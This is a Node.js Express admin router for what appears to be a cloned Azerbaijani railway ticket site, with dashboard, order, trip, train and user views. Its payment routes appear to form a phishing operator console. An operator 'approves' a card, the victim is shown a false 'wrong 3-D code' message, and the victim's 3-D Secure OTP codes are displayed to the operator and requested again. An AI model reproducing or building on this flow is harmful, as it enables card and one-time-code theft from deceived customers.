const express = require('express');
const dayjs = require('dayjs');
const {
  User, Order, Ticket, Train, Station, Trip, Payment, SeatBlock, SyncLog
} = require('../models/index');
const { requireAdmin } = require('../middleware/auth');
const scheduleService = require('../services/scheduleService');
const paymentService = require('../services/paymentService');
const liveSyncService = require('../services/liveSyncService');
const config = require('../config');
const adyContent = require('../config/adyContent');
const h = require('../utils/helpers');

/* Panel daxilində keçidlər üçün baza yol */
function adminBase(req) {
  const lang = req.params && req.params.lang ? req.params.lang : config.defaultLocale;
  return '/' + lang + '/admin';
}

/* İdarəetmə panelinin səhifə marşrutları (dil prefiksi altında) */
const pages = express.Router({ mergeParams: true });
/* İdarəetmə API-si (dil prefiksindən asılı deyil) */
const api = express.Router();

async function pendingCount() {
  return Payment.countDocuments({ status: { $in: ['pending_admin', 'code_submitted'] } });
}

/* Panelin bütün səhifələri yalnız idarəçiyə açıqdır */
pages.use(requireAdmin);

/* İdarəçi hesabı ilk dəfə yaranıbsa müvəqqəti şifrə xəbərdarlığı */
async function ensureEnvAdmin() {
  try {
    const email = String(config.adminEmail || '').trim().toLowerCase();
    if (!email) return;
    let user = await User.findOne({ email });
    if (!user) {
      if (!config.adminPassword) return;
      user = await User.create({
        firstName: config.adminFirstName || 'Sistem',
        lastName: config.adminLastName || 'İdarəçi',
        email,
        password: await User.hashPassword(config.adminPassword),
        role: 'admin',
        managedFromEnv: true,
        passwordResetForced: !!config.adminTempPassword,
        locale: config.defaultLocale
      });
      console.log('[admin] hesab yaradıldı: ' + email);
    } else if (user.role !== 'admin') {
      user.role = 'admin';
      await user.save();
    }
  } catch (e) {
    console.warn('[admin] hesab hazırlanmadı:', e.message);
  }
}

/* İdarəetmə panelinə giriş yoxlaması — girişsiz sorğu login səhifəsinə yönləndirilir */
function adminEntry(req, res, next) {
  if (req.currentUser && req.currentUser.role === 'admin') return next();
  const wantsJson = req.xhr || (req.headers.accept || '').includes('application/json');
  if (wantsJson) return res.status(403).json({ ok: false, message: res.locals.t('msg.noPermission') });
  return res.redirect('/' + config.defaultLocale + '/login?next=' + encodeURIComponent(req.originalUrl));
}

/* ==================== İcmal ==================== */
pages.get('/', adminEntry, async (req, res, next) => {
  try {
    const startOfDay = dayjs().startOf('day').toDate();
    const [
      userCount, orderCount, ticketCount, trainCount, stationCount,
      pending, todayTrips, revenueAgg, recentOrders, pendingPayments, lastSync
    ] = await Promise.all([
      User.countDocuments({ role: 'user' }),
      Order.countDocuments(),
      Ticket.countDocuments({ status: 'active' }),
      Train.countDocuments({ active: true }),
      Station.countDocuments({ active: true }),
      pendingCount(),
      Trip.countDocuments({ date: dayjs().format('YYYY-MM-DD') }),
      Order.aggregate([{ $match: { status: { $in: ['confirmed', 'paid'] } } }, { $group: { _id: null, total: { $sum: '$total' } } }]),
      Order.find().sort({ createdAt: -1 }).limit(8).lean(),
      Payment.find({ status: { $in: ['pending_admin', 'code_submitted'] } }).sort({ createdAt: -1 }).limit(8).lean(),
      SyncLog.findOne().sort({ createdAt: -1 }).lean()
    ]);

    res.render('pages/admin/dashboard', {
      title: 'İdarəetmə paneli',
      stats: {
        users: userCount,
        orders: orderCount,
        tickets: ticketCount,
        trains: trainCount,
        stations: stationCount,
        pending,
        todayTrips,
        revenue: revenueAgg.length ? revenueAgg[0].total : 0
      },
      recentOrders,
      pendingPayments,
      lastSync,
      startOfDay
    });
  } catch (e) { next(e); }
});

/* ==================== Ödəniş təsdiqləri ==================== */
pages.get('/odenisler', requireAdmin, async (req, res, next) => {
  try {
    const status = req.query.status || 'pending';
    const filter = status === 'pending'
      ? { status: { $in: ['pending_admin', 'awaiting_3ds', 'code_submitted', 'awaiting_final'] } }
      : status === 'all' ? {} : { status };

    const payments = await Payment.find(filter).sort({ createdAt: -1 }).limit(100).lean();
    const orderIds = payments.map((p) => p.order).filter(Boolean);
    const userIds = payments.map((p) => p.user).filter(Boolean);

    const [orders, users] = await Promise.all([
      Order.find({ _id: { $in: orderIds } }).lean(),
      User.find({ _id: { $in: userIds } }).lean()
    ]);

    const orderMap = {};
    orders.forEach((o) => { orderMap[String(o._id)] = o; });
    const userMap = {};
    users.forEach((u) => { userMap[String(u._id)] = u; });

    res.render('pages/admin/payments', {
      title: res.locals.t('admin.payments'),
      payments,
      orderMap,
      userMap,
      status,
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

/* ==================== Sifarişlər ==================== */
pages.get('/sifarisler', requireAdmin, async (req, res, next) => {
  try {
    const status = req.query.status || 'all';
    const filter = status === 'all' ? {} : { status };
    const orders = await Order.find(filter).sort({ createdAt: -1 }).limit(120).lean();
    const users = await User.find({ _id: { $in: orders.map((o) => o.user) } }).lean();
    const userMap = {};
    users.forEach((u) => { userMap[String(u._id)] = u; });

    res.render('pages/admin/orders', { title: res.locals.t('admin.orders'), orders, userMap, status, pending: await pendingCount() });
  } catch (e) { next(e); }
});

/* ==================== Reyslər və yerlər ==================== */
pages.get('/reysler', requireAdmin, async (req, res, next) => {
  try {
    const date = /^\d{4}-\d{2}-\d{2}$/.test(req.query.date || '') ? req.query.date : h.todayISO();
    const line = req.query.line || 'all';
    await scheduleService.ensureTripsForDate(date);
    const rows = await scheduleService.buildTimetableRows(date, line);
    const stations = await Station.find({ active: true }).sort({ order: 1 }).lean();

    /* Reys sənədlərini tapırıq ki, hər sətirdən birbaşa yer ekranına keçmək mümkün olsun */
    const trips = await Trip.find({ date }).select('_id trainNumber').lean();
    const tripMap = {};
    trips.forEach((t) => { tripMap[t.trainNumber] = String(t._id); });
    rows.forEach((r) => { r.tripId = tripMap[r.number] || ''; });

    res.render('pages/admin/trips', {
      title: res.locals.t('admin.trips'),
      rows, date, line, stations,
      dateText: h.azDate(date),
      today: h.todayISO(),
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

pages.get('/reys/:tripId', requireAdmin, async (req, res, next) => {
  try {
    const trip = await Trip.findById(req.params.tripId).lean();
    if (!trip) return next();

    const maps = (trip.classes || []).map((c) => scheduleService.buildSeatMap(trip, c.code)).filter(Boolean);
    const blocks = await SeatBlock.find({ trip: trip._id, active: true }).lean();
    const orders = await Order.find({ trip: trip._id, status: 'confirmed' }).lean();

    res.render('pages/admin/trip-detail', {
      title: 'Reys ' + trip.trainNumber,
      trip, maps, blocks, orders,
      dateText: h.azDate(trip.date),
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

/* ==================== Qatarlar / istifadəçilər / sinxronizasiya ==================== */
pages.get('/qatarlar', requireAdmin, async (req, res, next) => {
  try {
    const line = req.query.line || 'all';
    const filter = line === 'all' ? {} : { line };
    const trains = await Train.find(filter).sort({ number: 1 }).limit(300).lean();
    res.render('pages/admin/trains', { title: res.locals.t('admin.trains'), trains, line, total: trains.length, pending: await pendingCount() });
  } catch (e) { next(e); }
});

/* Yeni qatar / bilet (reys) əlavə etmək */
pages.get('/qatarlar/yeni', requireAdmin, async (req, res, next) => {
  try {
    const stations = await Station.find({ active: true }).sort({ country: 1, order: 1 }).lean();
    res.render('pages/admin/train-form', {
      title: res.locals.t('admin.newTitle'),
      train: null,
      stations,
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

pages.get('/qatarlar/:id/redakte', requireAdmin, async (req, res, next) => {
  try {
    const train = await Train.findById(req.params.id).lean();
    if (!train) return next();
    const stations = await Station.find({ active: true }).sort({ country: 1, order: 1 }).lean();
    res.render('pages/admin/train-form', {
      title: 'Reysi redaktə et: ' + train.number,
      train,
      stations,
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

pages.get('/istifadeciler', requireAdmin, async (req, res, next) => {
  try {
    const users = await User.find().sort({ createdAt: -1 }).limit(200).lean();
    res.render('pages/admin/users', { title: res.locals.t('admin.users'), users, pending: await pendingCount() });
  } catch (e) { next(e); }
});

pages.get('/sinxronizasiya', requireAdmin, async (req, res, next) => {
  try {
    const logs = await SyncLog.find().sort({ createdAt: -1 }).limit(30).lean();
    const { Setting } = require('../models/index');
    const noticeRow = await Setting.findOne({ key: 'notice' }).lean();
    const tickerRow = await Setting.findOne({ key: 'notice_ticker' }).lean();
    res.render('pages/admin/sync', {
      title: res.locals.t('admin.sync'),
      logs,
      sourceUrl: config.liveSourceUrl,
      enabled: config.liveSyncEnabled,
      intervalHours: config.liveSyncHours,
      noticeValue: noticeRow ? noticeRow.value : adyContent.NOTICE,
      tickerValue: tickerRow ? tickerRow.value : adyContent.NOTICE_TICKER,
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

/* ==================== API: ödəniş addımları ==================== */
api.post('/admin/payments/:id/approve-card', requireAdmin, async (req, res) => {
  try {
    const result = await paymentService.adminApproveCard(req.params.id, req.currentUser.email);
    return res.json({ ok: true, message: 'Kart təsdiqləndi. İstifadəçi "Səhv 3-D kod" məsajı görrəcək.' });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

/* 2-ci təsdiq: istifadəçidə 3-D OTP ekranı açılır */
api.post('/admin/payments/:id/open-otp', requireAdmin, async (req, res) => {
  try {
    const result = await paymentService.adminOpenOtp(req.params.id, req.currentUser.email);
    return res.json({ ok: true, message: 'OTP ekranı istifadəçiyə açıldı. Kod: ' + (result.code || 'ÖN ADAĞ'), code: result.code });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

/* Admin OTP kodu səhvdir dedikdə - istifadəçi yenidən cəhd edə biləcək */
api.post('/admin/payments/:id/reject-otp', requireAdmin, async (req, res) => {
  try {
    const result = await paymentService.adminRejectOtp(req.params.id, req.currentUser.email);
    return res.json({ ok: true, message: 'OTP kodu səhvdir. İstifadəçi yenidən cəhd edə biləcək. Yeni kod: ' + (result.code || 'ÖN ADAĞ'), code: result.code });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

api.post('/admin/payments/:id/approve-final', requireAdmin, async (req, res) => {
  try {
    const result = await paymentService.adminFinalApprove(req.params.id, req.currentUser.email);
    return res.json({
      ok: true,
      message: 'Ödəniş təsdiqləndi və biletlər verildi.',
      pnr: result.tickets.length ? result.tickets[0].pnr : ''
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

api.post('/admin/payments/:id/approve-topup', requireAdmin, async (req, res) => {
  try {
    const result = await paymentService.approveTopup(req.params.id, req.currentUser.email);
    return res.json({ ok: true, message: 'Balans artırımı təsdiqləndi.', balance: result.balance });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

api.post('/admin/payments/:id/decline', requireAdmin, async (req, res) => {
  try {
    await paymentService.adminDecline(req.params.id, (req.body || {}).reason, req.currentUser.email);
    return res.json({ ok: true, message: 'Ödəniş rədd edildi.' });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

/* ==================== API: sifariş statusu ==================== */
api.post('/orders/:id/status', requireAdmin, async (req, res) => {
  try {
    const order = await Order.findById(req.params.id);
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
    order.status = (req.body || {}).status || order.status;
    order.adminNote = (req.body || {}).note || order.adminNote;
    await order.save();
    return res.json({ ok: true, message: 'Status yeniləndi' });
  } catch (e) {
    return res.status(500).json({ ok: false, message: 'Yenilənmədi' });
  }
});

/* ==================== API: yer bağlama / açma ==================== */
api.post('/trips/:tripId/seats/block', requireAdmin, async (req, res) => {
  try {
    const b = req.body || {};
    const trip = await Trip.findById(req.params.tripId);
    if (!trip) return res.status(404).json({ ok: false, message: 'Reys tapılmadı' });

    const wagon = Number(b.wagon);
    const cls = (trip.classes || []).find((c) => c.code === b.classCode);
    if (!cls) return res.status(400).json({ ok: false, message: 'Sinif tapılmadı' });

    const seats = [];
    if (typeof b.seat === 'string' && b.seat.indexOf('-') > -1) {
      const parts = b.seat.split('-');
      const from = Number(parts[0]);
      const to = Number(parts[1]);
      for (let i = from; i <= to; i++) seats.push(i);
    } else if (b.seat) {
      seats.push(Number(b.seat));
    }

    const block = await SeatBlock.create({
      trip: trip._id,
      date: trip.date,
      classCode: b.classCode,
      wagon,
      seats,
      reason: b.reason || '',
      active: true
    });

    return res.json({ ok: true, message: 'Yerlər bağlandı', block });
  } catch (e) {
    return res.status(500).json({ ok: false, message: 'Bağlanmadı' });
  }
});

api.delete('/blocks/:blockId', requireAdmin, async (req, res) => {
  try {
    await SeatBlock.findByIdAndDelete(req.params.blockId);
    return res.json({ ok: true, message: 'Bağlantı açıldı' });
  } catch (e) {
    return res.status(500).json({ ok: false, message: 'Açılmadı' });
  }
});

module.exports = { pages, api };
